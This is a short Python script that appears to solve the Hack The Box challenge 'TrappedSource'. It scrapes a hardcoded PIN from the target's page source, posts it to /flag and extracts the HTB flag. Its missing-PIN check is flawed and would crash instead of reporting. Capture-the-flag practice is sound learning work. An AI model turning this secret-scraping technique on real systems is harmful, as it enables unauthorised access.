import sys
import requests
import re

if  len(sys.argv) != 2:
    print("Usage: python3 TrappedSource ip:port")
    sys.exit(1)

host = sys.argv[1]
url = f"http://{host}/flag"
code = f"http://{host}/"
html = requests.get(code).text
pin = re.search(r'correctPin:\s*["\'](\d{4})["\']', html).group(1)
if not pin:
    print("Pin not found!")
    sys.exit(1)

data = {
    "pin":pin
}
req = requests.post(url ,json=data)
flag = re.search(r"HTB\{.*?\}", req.text)
if  flag:
    print("Flag:", flag.group(0))
else:
    print("Flag not found!")